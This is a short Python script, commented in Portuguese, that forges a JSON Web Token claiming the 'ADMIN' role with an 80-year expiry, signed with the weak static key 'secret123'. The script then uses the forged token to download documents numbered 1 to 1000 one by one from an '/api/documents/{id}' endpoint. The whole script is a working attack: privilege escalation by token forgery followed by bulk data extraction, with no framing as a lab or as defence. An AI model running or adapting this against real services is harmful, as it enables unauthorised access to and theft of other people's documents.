# Bloco 1: Definição do payload do token
import jwt
import time

def criar_payload():
    # Definir a claim 'role' igual a 'ADMIN'
    role = 'ADMIN'
    
    # Definir a claim de expiração temporal 'exp' para o ano 2099
    exp = int(time.time()) + (365 * 24 * 60 * 60 * 80)  # 80 anos a partir de agora
    
    # Criar o dicionário com as claims
    payload = {
        'role': role,
        'exp': exp
    }
    
    return payload

# Bloco 2: Assinatura do payload para criar o token
def criar_token(payload):
    # Chave estática para assinatura
    chave = 'secret123'
    
    # Assinar o payload com o algoritmo 'HS256'
    token = jwt.encode(payload, chave, algorithm='HS256')
    
    return token

# Bloco 3: Automatização da transferência de documentos
import requests

def transferir_documentos(token):
    # Instanciar uma sessão do requests
    session = requests.Session()
    
    # Injetar o token no cabeçalho HTTP padrão da sessão
    session.headers['Authorization'] = f'Bearer {token}'
    
    # Executar transferências massivas do endpoint '/api/documents/{id}'
    for id in range(1, 1001):
        resposta = session.get(f'/api/documents/{id}')
        
        # Verificar se a transferência foi bem-sucedida
        if resposta.status_code == 200:
            print(f'Documento {id} transferido com sucesso!')
        else:
            print(f'Erro ao transferir documento {id}: {resposta.status_code}')

# Chamada da função para criar o payload
payload = criar_payload()

# Chamada da função para criar o token
token = criar_token(payload)

# Chamada da função para transferir os documentos
transferir_documentos(token)